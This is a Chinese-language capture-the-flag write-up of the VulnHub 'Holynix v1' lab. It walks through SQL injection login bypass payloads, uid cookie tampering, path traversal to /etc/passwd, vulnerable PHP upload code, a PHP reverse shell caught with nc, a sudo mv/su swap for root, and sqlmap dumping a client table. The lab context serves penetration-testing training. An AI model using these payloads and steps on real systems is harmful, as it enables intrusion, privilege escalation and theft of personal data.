---
title: Holynix-v1
author: Creexile
date: 2026-03-19
lastMod: 2026-03-19
summary: easyNo.17
cover: ''
category: 靶场
draft: false
comments: false
sticky: 0
tags:
  - 渗透
  - SQL注入
  - 提权
  - 文件上传
---

# Holynix

---

> 来源: [vulnhub靶场-Holynix v1](https://www.vulnhub.com/entry/holynix-v1,20/)
>
> 目标: The object of the challenge is to gain root level privileges and access to personal client information.
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

我已移动该虚拟机, NAT模式

- kali: 192.168.0.133
- target: 192.168.0.135

## 信息收集

nmap

```bash
# 获取靶机地址 192.168.0.135
sudo nmap -sn 192.168.0.0/24
# 获取端口信息 80
sudo nmap -sT --min-rate 10000 -p- 192.168.0.135 -oA scan/ports
# 获取详细信息 linux,php5.2.4,apache
sudo nmap -sT -sV -sC -O -p80 192.168.0.135 -oA scan/detail
# 看看漏洞
sudo nmap --script=vuln -p80 192.168.0.135 -oA scan/vuln
```

### 80/http

只有个登录框, 给它加个单引号, 发现报错sql

不用想了, 直接万能密码登录

```
admin / 1'or'1'='1
```

简单看两眼:

- Message Board和Calender模块中有一些对话
- Upload可以上传
- 注意到用户名是`alamo`

事不宜迟, 先来试试这个Upload

随便上传, 发现没有权限上传:

```
Home directory uploading disabled for user alamo
```

但是这也告诉我们文件上传之后的上传位置可能是用户的家目录

观察到url为`/index.php?page=transfer.php`, 应该是判断是否可以上传的文件

观察到请求包中有`Cookie: uid=1`, 尝试修改后重放, 发现每次返回用户名不同且有些uid可以上传文件, 明显存在水平越权

这是一个叫做`etenenbaum`的用户, 其uid为2且有上传权限

![](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/202603191632064.png)

那么接下来就是怎么找到这个木马文件并访问了

没进展的话不急, 来看看其他的: 在Security这个模块, 可以通过修改请求包的`text_file_name`参数进行任意文件读取, 多堆几个`../`就能读取到`/etc/passwd`

诶, 既然有文件包含, 我们来看看`upload.php`和前面的`transfer.php`

很明显的看到`$homedir`就是`/home/username`, 不过还注意到:

- 普通上传是直接上传到`/home/username`, 一般人不会傻到用root权限运行网站所以我们是www-data, 我们没法访问和运行这个文件里的东西
- 但是gzip解决了这个问题: 通过`sudo tar`解压创建的文件可以让所有人运行, 更是有`sudo mv`这种天才操作

```php
<?php
if ( $auth == 0 ) {
        echo "<center><h2>Content Restricted</h2></center>";
} else {
	if ( $upload == 1 )
	{
		$homedir = "/home/".$logged_in_user. "/";
		$uploaddir = "upload/";
		$target = $uploaddir . basename( $_FILES['uploaded']['name']) ;
		$uploaded_type = $_FILES['uploaded']['type'];
		$command=0;
		$ok=1;

		if ( $uploaded_type =="application/gzip" && $_POST['autoextract'] == 'true' ) {	$command = 1; }

		if ($ok==0)
		{
			echo "Sorry your file was not uploaded";
			echo "<a href='?index.php?page=upload.php' >Back to upload page</a>";
		} else {
        		if(move_uploaded_file($_FILES['uploaded']['tmp_name'], $target))
			{
				echo "<h3>The file '" .$_FILES['uploaded']['name']. "' has been uploaded.</h3><br />";
				echo "The ownership of the uploaded file(s) have been changed accordingly.";
				echo "<br /><a href='?page=upload.php' >Back to upload page</a>";
				if ( $command == 1 )
				{
					exec("sudo tar xzf " .$target. " -C " .$homedir);
					exec("rm " .$target);
				} else {
					exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
				}
				exec("/var/apache2/htdocs/update_own");
        		} else {
				echo "Sorry, there was a problem uploading your file.<br />";
				echo "<br /><a href='?page=upload.php' >Back to upload page</a>";
			}
		}
	} else { echo "<br /><br /><h3>Home directory uploading disabled for user " .$logged_in_user. "</h3>"; }
}
?>
```

问题来了, 访问`/home/alamo`都会显示无权限, 到这里就卡住了

经过一番搜索(搜索词:apache 访问 /home/username), 发现了这个东西:

> Apache的`mod_userdir`模块: 默认情况下启用该模块时，通过 `/~username` 格式可直接访问用户家目录中的 public_html 文件夹

还有这种好事, 直接来试试, 成功访问:

![](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/202603191712235.png)

剩下的就是利用:

## getshell

打包并上传文件(文件在`/usr/share/webshells/php/php-reverse-shell.php`, 记得改一下目标端口和ip):

```bash
tar czf shell.tar.gz php-reverse-shell.php
```

> 下面那个图是上传正向shell的, 我自己写的shell好像总是不行, 可能是特征太明显了? 另外kali同时也给了`php-backdoor.php`, 也能用

修改数据包并上传

![](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/202603191813030.png)

kali监听, 然后访问`/~etenenbaum/php-reverse-shell.php`即可

```bash
nc -lvnp 10000
```

## 信息收集

```bash
# 系统信息
uname -a
# 内核版本 2.6.24-26-server
uname -r
# 查看发行版的信息 Ubuntu 8.04.4 LTS
cat /etc/*release
# 查看环境
python -h
gcc -v
# 查看权限, 免密使用mv, tar, chgrp, chown
sudo -l
```

到这里已经可以结束了, 利用mv替换掉原来有sudo权限的命令即可

## 提权

```bash
sudo mv /bin/tar /bin/tar.bak
sudo mv /bin/su /bin/tar
sudo tar
```

这就已经拿到root了, 怎么没有flag

# 其他

## 获取用户信息

最后说的这个获取用户信息是啥, 如果是数据库的话, 登录界面通过sqlmap爆就好了:

将登录的请求包保存为bp.txt, 然后执行就行

```bash
sqlmap -r bp.txt -D clients -T accounts --dump
```

## 登录其他用户

可以在登录界面通过构造sql语句登录etenenbaum

```
' or username='etenenbaum' #
```

## 文件权限

![](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/202603191913792.png)

解压会还原打包时文件的644权限, 只执行mv移动文件不修改600权限, 所以直接上传的文件无法执行

root/普通用户默认`umask 022` → 文件默认 644
www-data默认`umask 077` → 文件默认 600
